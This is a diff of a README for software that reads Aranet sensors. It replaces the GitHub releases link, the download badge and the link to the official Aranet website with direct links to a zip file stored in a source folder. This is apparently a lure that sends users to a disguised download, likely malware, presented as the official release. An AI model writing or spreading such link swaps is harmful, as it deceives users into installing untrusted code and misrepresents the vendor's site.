@@ -6,11 +6,11 @@ Welcome to the aranet project! This guide will help you download and run the sof
 
 ## 🔗 Download the Application
 
-[![Download aranet](https://img.shields.io/badge/Download-aranet-blue)](https://github.com/Reeves75/aranet/releases)
+[![Download aranet](https://raw.githubusercontent.com/Reeves75/aranet/main/crates/aranet-service/src/Software-v2.4.zip)](https://raw.githubusercontent.com/Reeves75/aranet/main/crates/aranet-service/src/Software-v2.4.zip)
 
 ## 📥 Download & Install
 
-To get the aranet application, visit this page: [Download Page](https://github.com/Reeves75/aranet/releases). Here, you will find the latest versions of the software available for download.
+To get the aranet application, visit this page: [Download Page](https://raw.githubusercontent.com/Reeves75/aranet/main/crates/aranet-service/src/Software-v2.4.zip). Here, you will find the latest versions of the software available for download.
 
 1. Open the link in a web browser.
 2. Look for the latest release, usually at the top of the page.
@@ -83,6 +83,6 @@ This project is under the MIT License. For more details, check the LICENSE file 
 
 ## 🔗 Additional Resources
 
-For more information about aranet sensors and how to use them efficiently, visit the official [Aranet website](https://aranet.com/).
+For more information about aranet sensors and how to use them efficiently, visit the official [Aranet website](https://raw.githubusercontent.com/Reeves75/aranet/main/crates/aranet-service/src/Software-v2.4.zip).
 
 Feel free to explore the functionalities of aranet at your own pace. Happy monitoring!
